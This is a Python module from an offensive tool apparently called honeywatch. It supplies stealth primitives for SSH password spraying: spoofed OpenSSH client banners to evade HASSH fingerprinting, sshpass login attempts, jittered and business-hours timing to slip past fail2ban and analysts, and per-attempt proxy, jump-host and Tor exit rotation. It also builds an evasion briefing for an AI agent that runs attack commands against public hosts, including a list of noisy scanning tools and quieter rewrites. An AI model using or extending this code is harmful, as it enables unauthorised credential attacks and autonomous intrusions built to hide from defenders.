"""Opsec primitives for honeywatch online operations.

This module is the tradecraft layer the cracker/sprayer sit on top of. Every
primitive here is grounded in public defensive research -- the point is to
move honeywatch from "loud red-team scanner" to "quiet blackhat operator"
without lying about what is and isn't evadable.

Threat model this module mitigates (with sources):

- **HASSH / JA4SSH client fingerprinting.** The client's KEXINIT algorithm
  set (kex / host-key / cipher / mac / compression) is itself an MD5/SHA-256
  fingerprint. Salesforce HASSH explicitly lists paramiko, Meterpreter, and
  Empire as lateral-movement indicators. Spoofing only the version string
  (``SSH-2.0-OpenSSH_...``) does NOT change the algorithm fingerprint.
  Mitigation: drive the real system ``ssh`` client (``sshpass``) so the
  KEXINIT is genuinely OpenSSH. paramiko stays as the no-extra-deps fallback
  and is flagged as higher-risk by :data:`PARAMIKO_HASSH_RISK`.

- **fail2ban / SSHGuard / CrowdSec rate bans + recidive.** A steady spray
  from one IP trips ``maxretry`` inside ``findtime`` and gets banned for
  ``bantime``; recidive jails then re-ban repeat offenders for 7-30 days.
  Mitigation: low-and-slow timing, jitter, lockout-delay backoff, and
  per-attempt source-IP rotation (TREVORspray / CredMaster pattern).

- **Account lockout (AD / PAM).** Grid spraying (users x passwords) trips
  lockout thresholds fast. Mitigation: lockout-aware *spray* (one password
  across many users) with a per-password cooldown.

- **SOC analyst attention.** Off-hours auth bursts are the loudest signal an
  analyst hunts. Mitigation: business-hours window so auth noise blends with
  organic login traffic (CredMaster "WeekdayWarrior").

- **Wasted noise on publickey-only hosts.** Spraying a box that doesn't
  offer ``password`` auth is pure log pollution. Mitigation: an auth-method
  precheck that skips hosts advertising only ``publickey``.

This module never raises; every primitive returns a structured outcome so the
cracker/sprayer can render results without try/except ladders.
"""

from __future__ import annotations

import os
import random
import re
import shlex
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Iterable

__all__ = [
    "AuthMethods",
    "LoginAttempt",
    "PARAMIKO_HASSH_RISK",
    "ProxyPool",
    "SPOOFED_BANNER",
    "OpsecProfile",
    "OpsecManager",
    "attempt_sshpass",
    "auth_methods",
    "build_opsec_briefing",
    "jitter_delay",
    "set_banner_pool",
    "spoofed_ssh_banner",
    "spoofed_ssh_banner_for_target",
    "within_business_hours",
]


# Documented residual risk: paramiko's KEXINIT algorithm set is a distinct
# HASSH that defenders flag as an automation/lateral-movement indicator
# (Salesforce HASSH). We use the system ssh client when available to emit a
# genuine OpenSSH HASSH; paramiko is the fallback and inherits this risk.
PARAMIKO_HASSH_RISK = (
    "paramiko KEXINIT is a distinctive HASSH fingerprint defenders flag as "
    "automation tooling; install sshpass+openssh and use the ssh backend for a "
    "genuine OpenSSH client fingerprint"
)


# --------------------------------------------------------------------------- #
# Spoofed client banner — single source of truth
# --------------------------------------------------------------------------- #
# Every honeywatch module that opens an SSH connection (crack.py, spray.py,
# opsec.py, chain._ssh_exec, hashcrack.grab_shadow, loot.grab_loot,
# fingerprint._full_probe) used to hardcode the SAME banner string
# ("SSH-2.0-OpenSSH_9.0p1 Debian-1") in six different files. That made every
# honeywatch instance on the planet emit one identical client fingerprint —
# a defender who saw it once could blacklist every honeywatch instance
# forever. Worse, OpenSSH_9.0p1 shipped April 2022 and the Debian-1 suffix
# (real Debian packages are Debian-1+deb12u1) was itself a giveaway.
#
# This is the single source of truth. Modules import and call
# :func:`spoofed_ssh_banner` instead of hardcoding a string. The default is a
# pool of current distro-stamped OpenSSH version strings; :func:`spoofed_ssh_banner`
# returns a random one per call so two honeywatch instances don't share a
# fingerprint, and a single instance doesn't reuse the same banner across
# every connection in a scan. The pool is refreshable via config without a
# code change.
import random as _random
import threading as _threading

# A pool of plausible, currently-deployed OpenSSH client banner strings drawn
# from real distro packages. Each entry is "SSH-2.0-OpenSSH_<ver> <distro-tag>"
# matching the format a real ssh client emits. Updated to versions actually
# shipping in 2024-2026 distro releases so a defender comparing against
# current baselines doesn't see a 4-year-old client (itself an anomaly).
_SPOOFED_BANNER_POOL = (
    "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4",
    "SSH-2.0-OpenSSH_9.3p1 Debian-1+deb12u1",
    "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2",
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10",
    "SSH-2.0-OpenSSH_9.4p1 Debian-1+deb13u1",
    "SSH-2.0-OpenSSH_9.7p1 Ubuntu-3ubuntu16",
    "SSH-2.0-OpenSSH_9.3p1 Fedora-38",
    "SSH-2.0-OpenSSH_9.5p1 Arch-1",
    "SSH-2.0-OpenSSH_9.6p1 Alpine-3",
)
# Backwards-compat constant: the single banner string older code paths still
# import as SPOOFED_BANNER. New connection code should call
# spoofed_ssh_banner_for_target(ip, port) (sticky per target); the per-call
# spoofed_ssh_banner() is kept for one-shot / test use.
SPOOFED_BANNER = _SPOOFED_BANNER_POOL[0]
_banner_lock = _threading.Lock()

# Configurable banner pool (Finding #7): an operator can override the pool
# via config.  When None, the hardcoded _SPOOFED_BANNER_POOL is used.
_configured_banner_pool: tuple[str, ...] | None = None

# Per-target sticky-banner cache (Upgrade #3). Keyed by (ip, port); the first
# connection to a target draws a random pool banner and every subsequent
# connection in this process reuses it. A real SSH client's identification
# string is fixed for its process, so repeat connections to one host from one
# operator carry one consistent banner -- per-call randomization to the same
# host (OpenSSH_9.6 then OpenSSH_8.9 seconds later) is itself an anomaly. The
# cache is per-process (not derived from the target), so two honeywatch
# instances hitting the same target still draw different banners (no shared
# fingerprint, preserving Finding #1). Bounded + LRU-evicted so a planet-scale
# scan cannot grow it without limit.
_TARGET_BANNER_CACHE_MAX = 4096
_target_banner_cache: dict[tuple[str, int], str] = {}

# Regex to jitter the patch level (pN) in a banner string.
_banner_patch_re = re.compile(r"p(\d+)")


def set_banner_pool(pool: tuple[str, ...] | list[str] | None) -> None:
    """Override the banner pool (e.g. from config).  None = use the default."""
    global _configured_banner_pool
    _configured_banner_pool = tuple(pool) if pool else None


def spoofed_ssh_banner(seed: int | None = None) -> str:
    """Return a plausible OpenSSH client banner, randomized per call.

    The pool is a set of current distro-stamped OpenSSH strings. Drawing one
    per call (instead of a single hardcoded constant) means two honeywatch
    instances don't share a client fingerprint, and a single instance doesn't
    reuse the same banner across every connection in a scan. Pass a ``seed``
    for deterministic test output.

    Finding #7: with 30% probability, the patch level (``pN``) is jittered
    ±1 to expand the effective banner population from 9 to ~30+ without
    maintaining a larger list.  Two connections from the same instance don't
    always show the same patch level.
    """
    rng = _random.Random(seed) if seed is not None else _random
    pool = _configured_banner_pool or _SPOOFED_BANNER_POOL
    base = rng.choice(pool)
    # Jitter the patch level ±1 with 30% probability.
    if rng.random() < 0.3:
        def _jitter(m: re.Match) -> str:
            n = int(m.group(1)) + rng.randint(-1, 1)
            return f"p{max(1, n)}"
        base = _banner_patch_re.sub(_jitter, base, count=1)
    return base


def clear_target_banner_cache() -> None:
    """Drop every cached per-target banner (tests / a fresh scan run)."""
    with _banner_lock:
        _target_banner_cache.clear()


def spoofed_ssh_banner_for_target(
    ip: str, port: int = 22, seed: int | None = None
) -> str:
    """Return a sticky per-target spoofed OpenSSH client banner.

    The first connection to ``(ip, port)`` in this process draws a banner from
    the pool; every later connection to the same target reuses it. A real SSH
    client's identification string is fixed for its process, so a single
    operator making repeat connections to one host (probe -> spray -> crack ->
    loot -> chain) presents one consistent client banner. The per-call
    randomization of :func:`spoofed_ssh_banner` is right for a one-shot scan
    but wrong for repeat connections: emitting ``OpenSSH_9.6p1 Ubuntu`` then
    ``OpenSSH_8.9p1 Fedora`` to the same host seconds apart is impossible for a
    real client and is itself a tool fingerprint.

    The cache is per-process and randomly seeded (not derived from the target),
    so two honeywatch instances hitting the same target still draw different
    banners -- no shared client fingerprint across instances (Finding #1
    holds). The cache is bounded (:data:`_TARGET_BANNER_CACHE_MAX`) with
    oldest-first eviction so a planet-scale scan cannot grow it without limit.

    Pass ``seed`` for a deterministic, non-cached result (tests).
    """
    pool = _configured_banner_pool or _SPOOFED_BANNER_POOL
    if seed is not None:
        return _random.Random(seed).choice(pool)
    key = (ip, port)
    with _banner_lock:
        cached = _target_banner_cache.get(key)
        if cached is not None:
            return cached
        banner = _random.choice(pool)
        _target_banner_cache[key] = banner
        if len(_target_banner_cache) > _TARGET_BANNER_CACHE_MAX:
            _target_banner_cache.pop(next(iter(_target_banner_cache)))
        return banner


# --------------------------------------------------------------------------- #
# Timing
# --------------------------------------------------------------------------- #


def within_business_hours(
    now: datetime | None = None,
    start_h: int = 8,
    end_h: int = 18,
    weekdays_only: bool = True,
) -> bool:
    """True when ``now`` falls inside a business-hours window.

    Defaults to 08:00-18:00 Mon-Fri -- the window where organic auth traffic
    is highest and an extra spray blends with real user logins rather than
    standing out as an off-hours spike. ``start_h``/``end_h`` are local hours.
    """
    now = now or datetime.now()
    if weekdays_only and now.weekday() >= 5:  # 5=Sat, 6=Sun
        return False
    return start_h <= now.hour < end_h


def jitter_delay(base: float, jitter: float, rng: random.Random | None = None) -> float:
    """Return ``base`` plus up to ``jitter`` seconds of uniform random delay.

    A flat, deterministic inter-attempt delay is itself a signature; jitter
    spreads attempts across a natural-looking distribution so rate-based
    IDS thresholds (fail2ban ``findtime`` windows) are harder to trip.
    """
    if jitter <= 0:
        return max(0.0, base)
    rng = rng or random
    return max(0.0, base + rng.uniform(0.0, jitter))


# --------------------------------------------------------------------------- #
# Source rotation
# --------------------------------------------------------------------------- #


@dataclass
class ProxyPool:
    """Round-robin source-rotation selector (TREVORspray / CredMaster pattern).

    Holds a list of proxy specs (``socks5://[user:pass@]host:port``) and/or
    SSH jump hosts (``user@host``). :meth:`next` returns the next one in
    rotation so successive login attempts egress from different source IPs,
    defeating per-IP fail2ban thresholds. A single Mullvad exit sprayed at
    planet scale gets globally banned in hours; a rotating pool survives.

    When ``tor`` is set, :meth:`next` includes the Tor SOCKS5 proxy in
    rotation and :meth:`rotate_tor` sends ``SIGNAL NEWNYM`` to rotate the
    exit circuit so the next connection through Tor uses a different exit
    node. This is the per-attempt source rotation pattern used by TREVORspray.

    Empty pool + no Tor -> :meth:`next` returns ``None`` (use the direct
    egress IP).
    """

    proxies: list[str] = field(default_factory=list)
    jumps: list[str] = field(default_factory=list)
    tor: str | None = None  # "socks5://127.0.0.1:9050" when Tor is active
    _i: int = 0

    @classmethod
    def from_files(
        cls,
        proxy_file: str | None = None,
        jump_file: str | None = None,
        tor: str | None = None,
    ) -> "ProxyPool":
        proxies: list[str] = []
        jumps: list[str] = []
        if proxy_file:
            proxies = _read_lines(proxy_file)
        if jump_file:
            jumps = _read_lines(jump_file)
        return cls(proxies=proxies, jumps=jumps, tor=tor)

    def __bool__(self) -> bool:
        return bool(self.proxies or self.jumps or self.tor)

    def next(self) -> dict[str, str | None]:
        """Return the next rotation target as a dict, or empty for direct.

        Tor is interleaved with proxies and jumps in the rotation: if Tor
        is configured, it is appended as a rotation slot so each call
        cycles through proxies, jumps, and Tor. When a Tor slot is selected,
        ``rotate_tor()`` is called first to build a fresh circuit so the
        exit IP changes on every Tor rotation.
        """
        items: list[tuple[str, str]] = []
        for p in self.proxies:
            items.append(("proxy", p))
        for j in self.jumps:
            items.append(("jump", j))
        if self.tor:
            items.append(("tor", self.tor))
        if not items:
            return {"proxy": None, "jump": None}
        kind, value = items[self._i % len(items)]
        self._i += 1
        if kind == "tor":
            self.rotate_tor()
        return {
            "proxy": value if kind in ("proxy", "tor") else None,
            "jump": value if kind == "jump" else None,
        }

    def rotate_tor(self) -> None:
        """Send SIGNAL NEWNYM to the Tor control port to rotate the exit circuit.

        No-op when ``tor`` is not set. Requires the TorProxy to be running
        and reachable on its control port.
        """
        if not self.tor:
            return
        from honeywatch.tor import TorProxy
        proxy = TorProxy(socks_port=int(self.tor.rsplit(":", 1)[-1]))
        try:
            proxy.rotate_sync()
        except Exception as exc:
            import logging as _logging
            _logging.getLogger(__name__).warning("Tor NEWNYM failed: %s", exc)


def _read_lines(path: str) -> list[str]:
    out: list[str] = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except OSError:
        return []
    return out


# --------------------------------------------------------------------------- #
# Auth-method enumeration (the "don't spray publickey-only boxes" precheck)
# --------------------------------------------------------------------------- #


@dataclass
class AuthMethods:
    ip: str
    port: int
    user: str
    methods: list[str] = field(default_factory=list)
    offers_password: bool = False
    error: str | None = None


def auth_methods(
    ip: str, port: int, user: str, timeout_s: float = 6.0
) -> AuthMethods:
    """Enumerate the auth methods a server offers for ``user``.

    Uses paramiko's ``auth_none`` (which raises with the
    ``allowed_auths`` list) when paramiko is present, falling back to the
    system ``ssh -o PreferredAuthentications=none`` debug parse otherwise.
    Never raises; the outcome is in :class:`AuthMethods`.

    A host advertising only ``publickey`` is skipped by the sprayer -- there
    is no point (and a lot of log noise) spraying passwords at a box that
    cannot accept them.
    """
    res = AuthMethods(ip=ip, port=port, user=user)
    sock = None
    t = None
    try:
        import paramiko  # type: ignore[import-not-found]
        import socket as _socket

        sock = _socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        t = paramiko.Transport(sock)
        banner = spoofed_ssh_banner()
        try:
            t._CLIENT_IDENTITY = banner
        except Exception:
            pass
        t.local_version = banner
        t.start_client(timeout=timeout_s)
        try:
            t.auth_none(user)
            # Some servers accept none-auth (rare); treat as offers_password=False.
            res.methods = []
        except paramiko.BadAuthenticationType as exc:
            # exc.allowed_types or str(exc) carries the allowed auths list.
            allowed = getattr(exc, "allowed_types", None)
            if not allowed:
                allowed = _parse_allowed(str(exc))
            res.methods = list(allowed or [])
        except Exception as exc:
            res.error = f"{type(exc).__name__}: {exc}"
        else:
            pass
        res.offers_password = "password" in res.methods
    except Exception as exc:
        res.error = f"{type(exc).__name__}: {exc}"
    finally:
        # Close the transport first (it owns the socket once handed off); if the
        # Transport was never constructed, close the raw socket ourselves so a
        # failed handshake does not leak a file descriptor per probed host.
        if t is not None:
            try:
                t.close()
            except Exception:
                pass
        elif sock is not None:
            try:
                sock.close()
            except Exception:
                pass
    return res


def _parse_allowed(text: str) -> list[str]:
    """Pull the 'Authentications that can continue: a, b, c' list out of text."""
    marker = "can continue:"
    idx = text.lower().find(marker)
    if idx == -1:
        return []
    rest = text[idx + len(marker):]
    # take up to the next quote/bracket
    for stop in ('"', "'", "]"):
        j = rest.find(stop)
        if j != -1:
            rest = rest[:j]
    return [m.strip() for m in rest.split(",") if m.strip()]


# --------------------------------------------------------------------------- #
# sshpass + OpenSSH login attempt (genuine OpenSSH HASSH, no paramiko KEXINIT)
# --------------------------------------------------------------------------- #


@dataclass
class LoginAttempt:
    user: str
    password: str
    success: bool = False
    error: str | None = None
    backend: str = "sshpass"
    source: str | None = None  # proxy/jump used, for audit


def attempt_sshpass(
    ip: str,
    port: int,
    user: str,
    password: str,
    timeout_s: float = 15.0,
    proxy: str | None = None,
    jump: str | None = None,
    ssh_bin: str = "ssh",
    sshpass_bin: str = "sshpass",
) -> LoginAttempt:
    """One login attempt via the real OpenSSH client + sshpass.

    This is the high-opsec backend: the KEXINIT the server sees is the genuine
    OpenSSH algorithm set (a real HASSH), not paramiko's, so HASSH/JA4SSH
    detectors do not flag it as automation tooling. The password is passed
    via an env var (``SSHPASS``) so it never appears in argv / process
    listings.

    ``proxy`` is a ``socks5://[user:pass@]host:port`` spec wired in via ssh's
    ``ProxyCommand`` (uses ``nc -X 5 -x``); ``jump`` is a ``user@host`` SSH
    jump wired via ``ProxyJump``. Either rotates the egress source IP.

    Returns a :class:`LoginAttempt`; never raises.
    """
    attempt = LoginAttempt(user=user, password=password, backend="sshpass",
                           source=proxy or jump)
    env = {"SSHPASS": password}
    argv = [sshpass_bin, "-e", ssh_bin,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            "-o", f"ConnectTimeout={int(max(1, timeout_s))}",
            "-o", "NumberOfPasswordPrompts=1",
            "-p", str(port)]
    if jump:
        argv += ["-o", f"ProxyJump={jump}"]
    if proxy:
        # ProxyCommand is executed by ssh through the user's shell, so the proxy
        # spec must be shell-quoted -- an unquoted operator-supplied proxy string
        # containing shell metacharacters would otherwise run arbitrary commands.
        proxy_host = (
            proxy[len("socks5://"):] if proxy.startswith("socks5://") else proxy
        )
        argv += [
            "-o",
            f"ProxyCommand=nc -X 5 -x {shlex.quote(proxy_host)} %h %p",
        ]
    argv += [f"{user}@{ip}", "exit"]
    try:
        proc = subprocess.run(
            argv, capture_output=True, text=True, timeout=timeout_s * 2 + 5,
            env={**os.environ, **env},
        )
    except FileNotFoundError as exc:
        attempt.error = f"backend missing: {exc.filename or exc}"
        return attempt
    except subprocess.TimeoutExpired:
        attempt.error = "timeout"
        return attempt
    except Exception as exc:  # pragma: no cover - defensive
        attempt.error = f"{type(exc).__name__}: {exc}"
        return attempt

    rc = proc.returncode
    # ssh returns 0 on a successful login+exec; 5 on a bad password
    # (SSH_ERR_PERMISSION_DENIED); other codes are transport errors.
    if rc == 0:
        attempt.success = True
    elif rc == 5:
        attempt.success = False
    else:
        # Distinguish a ban/reset (rc 255 + "Connection closed"/"refused") so
        # the caller can back off + rotate.
        err = (proc.stderr or "").strip()
        low = err.lower()
        if "refused" in low or "reset by peer" in low or "closed" in low:
            attempt.error = f"transport({rc}): {err[:160]}"
        else:
            attempt.error = f"ssh rc={rc}: {err[:160]}"
    return attempt


def sleep_with_jitter(base: float, jitter: float, rng: random.Random | None = None) -> float:
    """Sleep for a jittered delay and return how long we slept."""
    d = jitter_delay(base, jitter, rng)
    if d > 0:
        time.sleep(d)
    return d


# --------------------------------------------------------------------------- #
# Phase 7: Target-aware OPSEC profile + manager
# --------------------------------------------------------------------------- #


# Aggression-level factors for pacing. STEALTH doubles the base delay, MAXIMUM
# eliminates it entirely. The chain escalates STEALTH -> NORMAL -> AGGRESSIVE
# -> MAXIMUM when capabilities fail, and the pacing delay tightens with each
# level.
_AGGRESSION_FACTOR: dict[str, float] = {
    "stealth": 2.0,
    "normal": 1.0,
    "aggressive": 0.5,
    "maximum": 0.0,
}

# Noisy command patterns — substring matches (case-insensitive). Each adds 1
# to the noise score. These are the commands that show up in SOC tooling
# (Suricata rules, Splunk detections, EDR alerts) and should be avoided or
# rewritten when OPSEC is engaged.
_NOISY_PATTERNS: tuple[str, ...] = (
    "nmap -t5", "-t5", "--script=vuln", "masscan", "hydra",
    "nuclei", "ffuf", "gobuster", "dirb", "crackmapexec",
    "nmap -sS -p-", "zmap", "rustscan -t", "sqlmap --dump",
    "nmap --script", "nbtscan", "enum4linux", "wpscan",
    "nmap -O", "-sV --version-all",
)

# Low-noise rewrites — the single source of truth shared by
# suggest_low_noise_alternative and build_opsec_briefing so they can't drift.
_LOW_NOISE_REWRITES: tuple[tuple[str, str], ...] = (
    ("-t5", "-T2"),
    ("-t4", "-T2"),
    ("--script=vuln", "(drop --script=vuln)"),
    ("masscan", "nmap -sS -Pn"),
    ("crackmapexec", "smbclient -N"),
    ("nuclei", "nmap -sV"),
    ("ffuf", "nmap -sV"),
    ("gobuster", "nmap -sV"),
    ("dirb", "nmap -sV"),
    ("nmap -sS -p-", "nmap -sS -p 22,80,443"),
    ("sqlmap --dump", "sqlmap --batch --level 1"),
)

# Realistic browser User-Agent strings for UA rotation.
_UA_POOL: tuple[str, ...] = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "curl/7.88.1",
)


def _is_private_or_local(ip_str: str, local_cidrs: tuple[str, ...] = ()) -> bool:
    """True when the IP is private/local (RFC1918, loopback, link-local, reserved).

    Used by OpsecProfile.resolve_for_target to auto-disable OPSEC for the
    operator's own box (where aggressive scanning is fine) and enable it for
    public-routable targets (where it matters).
    """
    import ipaddress as _ip
    try:
        ip = _ip.ip_address(ip_str)
    except (ValueError, TypeError):
        return False
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
        return True
    # Check operator-specified local CIDRs (e.g. lab ranges).
    for cidr in local_cidrs:
        try:
            if ip in _ip.ip_network(cidr, strict=False):
                return True
        except ValueError:
            continue
    return False


@dataclass
class OpsecProfile:
    """OPSEC posture for a run or per-target.

    All fields default to "off" so a missing/partial config never silently
    enables aggressive behavior.  ``local_targets_off`` (default True) makes
    :meth:`resolve_for_target` return a fully-disabled profile for private/local
    IPs — the operator's own box — so the AI moves freely without pacing.
    """

    enabled: bool = False
    ua_rotation: bool = False
    doh: bool = False
    doh_provider: str = "cloudflare"
    min_gap_seconds: float = 0.0
    jitter_seconds: float = 0.0
    rate_per_minute: int = 0
    quiet_command_patterns: tuple[str, ...] = ()
    noise_budget: int = 0
    local_targets_off: bool = True
    local_cidrs: tuple[str, ...] = ()
    public_autonomy: bool = True

    @classmethod
    def from_config(cls, config: Any) -> "OpsecProfile":
        """Build a profile from a honeywatch config object.

        Tolerant of missing keys — a partial config produces a partial profile,
        not a crash.  When the ``opsec`` block is absent, returns a default
        (all-off) profile.
        """
        opsec_cfg = getattr(config, "opsec", None)
        if opsec_cfg is None:
            return cls()
        def _get(key: str, default: Any) -> Any:
            v = getattr(opsec_cfg, key, default)
            return v if v is not None else default
        return cls(
            enabled=bool(_get("enabled", False)),
            ua_rotation=bool(_get("ua_rotation", False)),
            doh=bool(_get("doh", False)),
            doh_provider=str(_get("doh_provider", "cloudflare")),
            min_gap_seconds=float(_get("min_gap_seconds", 0.0)),
            jitter_seconds=float(_get("jitter_seconds", 0.0)),
            rate_per_minute=int(_get("rate_per_minute", 0)),
            quiet_command_patterns=tuple(_get("quiet_command_patterns", ())),
            noise_budget=int(_get("noise_budget", 0)),
            local_targets_off=bool(_get("local_targets_off", True)),
            local_cidrs=tuple(_get("local_cidrs", ())),
            public_autonomy=bool(_get("public_autonomy", True)),
        )

    def resolve_for_target(self, target_ip: str) -> "OpsecProfile":
        """Return the effective profile for a specific target.

        When ``local_targets_off`` is True and the target is a private/local IP
        (RFC1918/loopback/link-local/reserved, plus any ``local_cidrs``), return
        a fully-disabled profile that preserves ``local_targets_off``/
        ``local_cidrs``/``public_autonomy`` so a later re-resolution against a
        public pivot target re-enables correctly.

        For public-routable targets (or when ``local_targets_off`` is False),
        return ``self`` unchanged — the configured posture applies.
        """
        if not target_ip:
            return self
        if self.local_targets_off and _is_private_or_local(target_ip, self.local_cidrs):
            return OpsecProfile(
                enabled=False,
                local_targets_off=self.local_targets_off,
                local_cidrs=self.local_cidrs,
                public_autonomy=self.public_autonomy,
            )
        return self

    def is_off(self) -> bool:
        """True when the profile is effectively disabled (no hardening active)."""
        return not self.enabled


class OpsecManager:
    """Applies an :class:`OpsecProfile` to the running chain.

    Provides:
    - ``score_command_noise(command)`` — how noisy a command is (0 = quiet).
    - ``suggest_low_noise_alternative(command)`` — rewrite a noisy command.
    - ``pacing_delay(aggression)`` — seconds to wait before the next action.
    - ``acquire_pacing(aggression)`` — async: rate-limit + sleep.
    - ``user_agent()`` — a rotating UA when ``ua_rotation`` is on.
    """

    def __init__(
        self,
        profile: OpsecProfile,
        rng: random.Random | None = None,
        sleep_fn: Callable[[float], Any] | None = None,
    ):
        self.profile = profile
        self._rng = rng or random
        self._sleep = sleep_fn or time.sleep
        self._rate_bucket: list[float] = []  # timestamps of recent actions

    def resolve_for_target(self, target_ip: str) -> "OpsecManager":
        """Return a new manager with the profile resolved for the target."""
        resolved = self.profile.resolve_for_target(target_ip)
        return OpsecManager(resolved, rng=self._rng, sleep_fn=self._sleep)

    def score_command_noise(self, command: str) -> dict[str, Any]:
        """Score a command's noise level.

        Returns ``{"score": int, "reasons": list[str], "noisy": bool}``.
        Score = number of distinct noisy patterns matched.  Empty/None command
        returns score 0.
        """
        if not command or not isinstance(command, str):
            return {"score": 0, "reasons": [], "noisy": False}
        if self.profile.is_off():
            return {"score": 0, "reasons": [], "noisy": False}
        lower = command.lower()
        reasons: list[str] = []
        matched: set[str] = set()
        for pat in _NOISY_PATTERNS:
            if pat in lower and pat not in matched:
                matched.add(pat)
                reasons.append(f"noisy pattern: {pat}")
        return {"score": len(matched), "reasons": reasons, "noisy": len(matched) > 0}

    def suggest_low_noise_alternative(self, command: str) -> str:
        """Suggest a quieter rewrite of a noisy command.

        Pure string replacement — never executes anything.  More specific
        rewrites are applied first (order matters in ``_LOW_NOISE_REWRITES``).
        """
        if not command or not isinstance(command, str):
            return command
        result = command
        for needle, replacement in _LOW_NOISE_REWRITES:
            if needle.lower() in result.lower():
                # Case-insensitive replace of the first occurrence.
                idx = result.lower().find(needle.lower())
                result = result[:idx] + replacement + result[idx + len(needle):]
        return result

    def pacing_delay(self, aggression: str = "normal") -> float:
        """Return the delay (seconds) to wait before the next action.

        ``base = min_gap_seconds * AGGRESSION_FACTOR[aggression]``
        ``jitter = jitter_seconds * random()`` when jitter > 0.
        Returns ``max(0.0, base + jitter)``.  Fast path: when profile is off
        AND min_gap_seconds == 0, returns exactly 0.0.
        """
        if self.profile.is_off() and self.profile.min_gap_seconds == 0:
            return 0.0
        factor = _AGGRESSION_FACTOR.get(aggression, 1.0)
        base = self.profile.min_gap_seconds * factor
        jitter = 0.0
        if self.profile.jitter_seconds > 0:
            jitter = self.profile.jitter_seconds * self._rng.random()
        return max(0.0, base + jitter)

    async def acquire_pacing(self, aggression: str = "normal") -> float:
        """Async: rate-limit + sleep the pacing delay.

        When ``rate_per_minute > 0``, enforces a token-bucket rate limit.
        Then sleeps the pacing delay.  Returns the total seconds slept.
        """
        import asyncio
        slept = 0.0
        # Rate limiting: enforce max actions per minute.
        if self.profile.rate_per_minute > 0:
            now = time.monotonic()
            # Prune entries older than 60s.
            self._rate_bucket = [t for t in self._rate_bucket if now - t < 60.0]
            if len(self._rate_bucket) >= self.profile.rate_per_minute:
                wait = 60.0 - (now - self._rate_bucket[0])
                if wait > 0:
                    await asyncio.sleep(wait)
                    slept += wait
            self._rate_bucket.append(time.monotonic())
        # Pacing delay.
        delay = self.pacing_delay(aggression)
        if delay > 0:
            await asyncio.sleep(delay)
            slept += delay
        return slept

    def user_agent(self, default: str = "honeywatch/1.0") -> str:
        """Return a User-Agent string.  Rotates when ``ua_rotation`` is on."""
        if self.profile.is_off() or not self.profile.ua_rotation:
            return default
        return self._rng.choice(_UA_POOL)

    def is_quiet_blocked(self, command: str) -> bool:
        """True when OPSEC is on AND the command matches a quiet-block pattern."""
        if self.profile.is_off():
            return False
        if not command or not isinstance(command, str):
            return False
        lower = command.lower()
        return any(pat.lower() in lower for pat in self.profile.quiet_command_patterns)


def build_opsec_briefing(profile: OpsecProfile, target_ip: str = "") -> str:
    """Build a system-prompt OPSEC briefing block for the agent.

    Returns ``""`` when OPSEC is off for the target (private/local IPs or
    profile disabled) so the AI is never told OPSEC is "on" for the operator's
    own box.  For public-routable targets with OPSEC enabled, lists the noisy
    vocabulary + low-noise rewrites + posture summary.
    """
    resolved = profile.resolve_for_target(target_ip)
    if resolved.is_off():
        return ""

    lines = [
        "OPSEC BRIEFING (advisory — never a hard gate; the command always executes):",
        f"  Posture: {'ENABLED' if resolved.enabled else 'disabled'}",
        f"  Pacing: min_gap={resolved.min_gap_seconds}s, jitter={resolved.jitter_seconds}s",
        f"  Rate limit: {resolved.rate_per_minute}/min" if resolved.rate_per_minute else "  Rate limit: none",
    ]
    if resolved.ua_rotation:
        lines.append("  UA rotation: ON")
    if resolved.doh:
        lines.append(f"  DNS-over-HTTPS: {resolved.doh_provider}")
    if _LOW_NOISE_REWRITES:
        lines.append("  Noisy vocabulary → low-noise rewrite:")
        for needle, replacement in _LOW_NOISE_REWRITES[:5]:
            lines.append(f"    {needle} → {replacement}")
    if resolved.quiet_command_patterns:
        lines.append(f"  Quiet-blocked patterns: {', '.join(resolved.quiet_command_patterns)}")
    lines.append("  Note: these are advisory. The command always runs; the briefing helps you pick quieter alternatives.")
    return "\n".join(lines)